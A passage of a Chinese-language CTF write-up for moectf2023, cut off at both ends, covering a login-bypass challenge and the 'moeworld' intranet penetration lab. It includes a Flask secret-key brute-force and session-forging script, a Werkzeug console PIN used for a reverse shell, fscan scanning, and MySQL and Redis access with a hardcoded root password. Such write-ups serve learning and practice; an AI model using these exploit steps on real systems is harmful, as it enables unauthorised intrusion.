DhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>                self.send_response(<span class="hljs-number">200</span>)<br>                self.end_headers()<br>                self.wfile.write(__page__)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>:<br>                body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>                payload = json.loads(body)<br>                params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br>                <span class="hljs-built_in">print</span>(params)<br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))        <span class="hljs-comment"># md5(username)^md5(password)</span><br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self.send_response(<span class="hljs-number">200</span>)<br>                        self.end_headers()<br>                        self.wfile.write(json.dumps(data).encode())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        <span class="hljs-keyword">return</span><br>                self.send_response(<span class="hljs-number">403</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p><code>def do_POST(self)</code>方法做了几个限制<br><code>username 不能等于 admin</code><br><code>username 不能等于 password</code><br>可以利用字符和数字进行绕过，例如<code>username=&quot;1&quot;  password=1</code><br><img src="/mdimg/moectf2023/35.png"></p><h3 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h3><p><code>moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;</code>解压密码</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">本题你将扮演<span class="hljs-strong">**红队**</span>的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag<br><br>题目环境：http://47.115.201.35:8000/<br><br>在本次公共环境中渗透测试中，希望你<span class="hljs-strong">**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**</span><br><br><span class="hljs-strong">**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**</span><br><br>hint.zip 密码请在拿到外网靶机后访问根目录下的<span class="hljs-strong">**readme**</span>，完成条件后获取<br><br>环境出现问题，请第一时间联系出题人<span class="hljs-strong">**xlccccc**</span><br><br>对题目有疑问，也可随时询问出题人<br></code></pre></td></tr></table></figure><p>进入靶机注册登录之后<br><img src="/mdimg/moectf2023/36.png"><br>给了session 的key的前面的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        self.secret_key = secret_key<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>        <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            app = MockApp(secret_key)<br><br>            session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>            si = SecureCookieSessionInterface()<br>            s = si.get_signing_serializer(app)<br><br>            <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> secret_key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                compressed = <span class="hljs-literal">False</span><br>                payload = session_cookie_value<br>                <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                    compressed = <span class="hljs-literal">True</span><br>                    payload = payload[<span class="hljs-number">1</span>:]<br>                data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br>                data = base64_decode(data)<br>                <span class="hljs-keyword">if</span> compressed:<br>                    data = zlib.decompress(data)<br>                <span class="hljs-keyword">return</span> data<br>            <span class="hljs-keyword">else</span>:<br>                app = MockApp(secret_key)<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cnt = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        cookie_value = <span class="hljs-string">&#x27;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6InpoYW55aSJ9.ZRU6Zg.c4JlmybB6IBoCVt7x1gJfKoRha4&#x27;</span><br>        secret_key = <span class="hljs-string">&quot;This-random-secretKey-you-can&#x27;t-get&quot;</span> + os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()<br>        <span class="hljs-keyword">if</span> secret_key:<br>            result = FSCM.decode(cookie_value, secret_key)<br>        <span class="hljs-keyword">else</span>:<br>            result = FSCM.decode(cookie_value)<br>        cnt += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(result, cnt)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;power&#x27;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(result, secret_key, <span class="hljs-string">&#x27;YES&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>用脚本爆破得到key：<code>This-random-secretKey-you-can&#39;t-get002c</code><br>尝试session伪造</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key=<span class="hljs-string">&quot;This-random-secretKey-you-can&#x27;</span>t-get002c<span class="hljs-string">&quot;</span><br><span class="hljs-string">    print(FSCM.encode(key,&quot;</span>&#123;<span class="hljs-string">&#x27;power&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;<span class="hljs-string">&quot;))</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/37.png"><br><code>[http://47.115.201.35:8000/console](http://47.115.201.35:8000/console)</code>  <code>138-429-604</code><br>反弹shell<br><img src="/mdimg/moectf2023/38.png"><br><code>moectf&#123;Information-leakage-Is-dangerous!</code><br>另外根目录下也有readme文件<br><img src="/mdimg/moectf2023/39.png"><br><img src="/mdimg/moectf2023/40.png"><br>python获取本机内网ip<br><img src="/mdimg/moectf2023/41.png"><br>使用fscan扫描：<code>./fscan -h 172.21.0.3/24 -np -no -nopoc</code><br>解压密码：<code>22-3306-6379-8080</code></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果<br>可以看到，在本内网下还有另外两台服务器<br>其中一台开启了<span class="hljs-number">22</span>(ssh)和<span class="hljs-number">6379</span>(redis)端口<br>另一台开启了<span class="hljs-number">3306</span>(mysql)端口<br>还有一台正是你访问到的留言板服务<br>接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器<br>此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件<br>连接代理，推荐`proxychains`<br>对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2<br>对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3<br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/42.png"><br><img src="/mdimg/moectf2023/43.png"><br>在shell里装一个pymysql <code>pip install pymysql</code><br><img src="/mdimg/moectf2023/44.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import pymysql<br>&gt;&gt;&gt; db = pymysql.<span class="hljs-title function_ invoke__">connect</span>(host=<span class="hljs-string">&quot;mysql&quot;</span>,port=<span class="hljs-number">3306</span>,user=<span class="hljs-string">&quot;root&quot;</span>,passwd=<span class="hljs-string">&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;</span>,database=<span class="hljs-string">&quot;messageboard&quot;</span>,charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>&lt;Nev3r_Kn0w<span class="hljs-string">&quot;,database=&quot;</span>messageboard<span class="hljs-string">&quot;,charset=&#x27;utf8&#x27;)</span><br><span class="hljs-string">&gt;&gt;&gt; cursor=db.cursor()</span><br><span class="hljs-string">cursor=db.cursor()</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>show databases<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>show databases<span class="hljs-string">&quot;)</span><br><span class="hljs-string">5</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>show tables<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>show tables<span class="hljs-string">&quot;)</span><br><span class="hljs-string">3</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.fetchall()</span><br><span class="hljs-string">cursor.fetchall()</span><br><span class="hljs-string">((&#x27;flag&#x27;,), (&#x27;message&#x27;,), (&#x27;users&#x27;,))</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>select *<span class="hljs-keyword">from</span> flag<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>select *<span class="hljs-keyword">from</span> flag<span class="hljs-string">&quot;)</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.fetchall()</span><br><span class="hljs-string">cursor.fetchall()</span><br><span class="hljs-string">((&#x27;-Are-YOu-myS0L-MasT3r?-&#x27;,),)</span><br><span class="hljs-string">&gt;&gt;&gt; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>得到<code>-Are-YOu-myS0L-MasT3r?-</code><br><code>pip install redis</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; r = redis.<span class="hljs-title function_ invoke__">Redis</span>(host=<span class="hljs-string">&#x27;172.20.0.2&#x27;</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>)<br>r = redis.<span class="hljs-title function_ invoke__">Redis</span>(host=<span class="hljs-string">&#x27;172.20.0.2&#x27;</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>)<br>&gt;&gt;&gt; r.<span class="hljs-title function_ invoke__">info</span>()<br>r.<span class="hljs-title function_ invoke__">info</span>()<br>&#123;<span class="hljs-string">&#x27;redis_version&#x27;</span>: <span class="hljs-string">&#x27;6.2.14&#x27;</span>, <span class="hljs-string">&#x27;redis_git_sha1&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;redis_git_dirty&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;redis_build_id&#x27;</span>: <span class="hljs-string">&#x27;32759a165f0d308e&#x27;</span>, <span class="hljs-string">&#x27;redis_mode&#x27;</span>: <span class="hljs-string">&#x27;standalone&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>: <span class="hljs-string">&#x27;Linux 5.15.0-71-generic x86_64&#x27;</span>, <span class="hljs-string">&#x27;arch_bits&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;monotonic_clock&#x27;</span>: <span class="hljs-string">&#x27;POSIX clock_gettime&#x27;</span>, <span class="hljs-string">&#x27;multiplexing_api&#x27;</span>: <span class="hljs-string">&#x27;epoll&#x27;</span>, <span class="hljs-string">&#x27;atomicvar_api&#x27;</span>: <span class="hljs-string">&#x27;c11-builtin&#x27;</span>, <span class="hljs-string">&#x27;gcc_version&#x27;</span>: <span class="hljs-string">&#x27;12.2.0&#x27;</span>, <span class="hljs-string">&#x27;process_id&#x27;</span>: <span class="hljs-number">19</span>, <span class="hljs-string">&#x27;process_supervised&#x27;</span>: <span class="hljs-string">&#x27;no&#x27;</span>, <span class="hljs-string">&#x27;run_id&#x27;</span>: <span class="hljs-string">&#x27;5ed13119850428cace41651d5a84dddee600dbe8&#x27;</span>, <span class="hljs-string">&#x27;tcp_port&#x27;</span>: <span class="hljs-number">6379</span>, <span class="hljs-string">&#x27;server_time_usec&#x27;</span>: <span class="hljs-number">1697725339377424</span>, <span class="hljs-string">&#x27;uptime_in_seconds&#x27;</span>: <span class="hljs-number">14190</span>, <span class="hljs-string">&#x27;uptime_in_days&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;hz&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;configured_hz&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;lru_clock&#x27;</span>: <span class="hljs-number">3226523</span>, <span class="hljs-string">&#x27;executable&#x27;</span>: <span class="hljs-string">&#x27;/data/redis-server&#x27;</span>, <span class="hljs-string">&#x27;config_file&#x27;</span>: <span class="hljs-string">&#x27;/etc/redis/redis.conf&#x27;</span>, <span class="hljs-string">&#x27;io_threads_active&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;connected_clients&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;cluster_connections&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxclients&#x27;</span>: <span class="hljs-number">10000</span>, <span class="hljs-string">&#x27;client_recent_max_input_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;client_recent_max_output_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;blocked_clients&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_clients&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;clients_in_timeout_table&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_memory&#x27;</span>: <span class="hljs-number">875704</span>, <span class="hljs-string">&#x27;used_memory_human&#x27;</span>: <span class="hljs-string">&#x27;855.18K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_rss&#x27;</span>: <span class="hljs-number">3837952</span>, <span class="hljs-string">&#x27;used_memory_rss_human&#x27;</span>: <span class="hljs-string">&#x27;3.66M&#x27;</span>, <span class="hljs-string">&#x27;used_memory_peak&#x27;</span>: <span class="hljs-number">875704</span>, <span class="hljs-string">&#x27;used_memory_peak_human&#x27;</span>: <span class="hljs-string">&#x27;855.18K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_peak_perc&#x27;</span>: <span class="hljs-string">&#x27;100.19%&#x27;</span>, <span class="hljs-string">&#x27;used_memory_overhead&#x27;</span>: <span class="hljs-number">811944</span>, <span class="hljs-string">&#x27;used_memory_startup&#x27;</span>: <span class="hljs-number">811944</span>, <span class="hljs-string">&#x27;used_memory_dataset&#x27;</span>: <span class="hljs-number">63760</span>, <span class="hljs-string">&#x27;used_memory_dataset_perc&#x27;</span>: <span class="hljs-string">&#x27;100.00%&#x27;</span>, <span class="hljs-string">&#x27;allocator_allocated&#x27;</span>: <span class="hljs-number">845608</span>, <span class="hljs-string">&#x27;allocator_active&#x27;</span>: <span class="hljs-number">1105920</span>, <span class="hljs-string">&#x27;allocator_resident&#x27;</span>: <span class="hljs-number">3469312</span>, <span class="hljs-string">&#x27;total_system_memory&#x27;</span>: <span class="hljs-number">1743826944</span>, <span class="hljs-string">&#x27;total_system_memory_human&#x27;</span>: <span class="hljs-string">&#x27;1.62G&#x27;</span>, <span class="hljs-string">&#x27;used_memory_lua&#x27;</span>: <span class="hljs-number">30720</span>, <span class="hljs-string">&#x27;used_memory_lua_human&#x27;</span>: <span class="hljs-string">&#x27;30.00K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_scripts&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_memory_scripts_human&#x27;</span>: <span class="hljs-string">&#x27;0B&#x27;</span>, <span class="hljs-string">&#x27;number_of_cached_scripts&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxmemory&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxmemory_human&#x27;</span>: <span class="hljs-string">&#x27;0B&#x27;</span>, <span class="hljs-string">&#x27;maxmemory_policy&#x27;</span>: <span class="hljs-string">&#x27;noeviction&#x27;</span>, <span class="hljs-string">&#x27;allocator_frag_ratio&#x27;</span>: <span class="hljs-number">1.31</span>, <span class="hljs-string">&#x27;allocator_frag_bytes&#x27;</span>: <span class="hljs-number">260312</span>, <span class="hljs-string">&#x27;allocator_rss_ratio&#x27;</span>: <span class="hljs-number">3.14</span>, <span class="hljs-string">&#x27;allocator_rss_bytes&#x27;</span>: <span class="hljs-number">2363392</span>, <span class="hljs-string">&#x27;rss_overhead_ratio&#x27;</span>: <span class="hljs-number">1.11</span>, <span class="hljs-string">&#x27;rss_overhead_bytes&#x27;</span>: <span class="hljs-number">368640</span>, <span class="hljs-string">&#x27;mem_fragmentation_ratio&#x27;</span>: <span class="hljs-number">4.73</span>, <span class="hljs-string">&#x27;mem_fragmentation_bytes&#x27;</span>: <span class="hljs-number">3026008</span>, <span class="hljs-string">&#x27;mem_not_counted_for_evict&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_replication_backlog&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_clients_slaves&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_clients_normal&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_aof_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_allocator&#x27;</span>: <span class="hljs-string">&#x27;jemalloc-5.1.0&#x27;</span>, <span class="hljs-string">&#x27;active_defrag_running&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;lazyfree_pending_objects&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;lazyfreed_objects&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;loading&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_cow_size_age&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_fork_perc&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;current_save_keys_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_save_keys_total&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_changes_since_last_save&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_bgsave_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_last_save_time&#x27;</span>: <span class="hljs-number">1697711149</span>, <span class="hljs-string">&#x27;rdb_last_bgsave_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;rdb_last_bgsave_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rdb_current_bgsave_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rdb_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_enabled&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_rewrite_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_rewrite_scheduled&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_last_rewrite_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;aof_current_rewrite_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;aof_last_bgrewrite_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;aof_last_write_status&#x27;</span>: <span 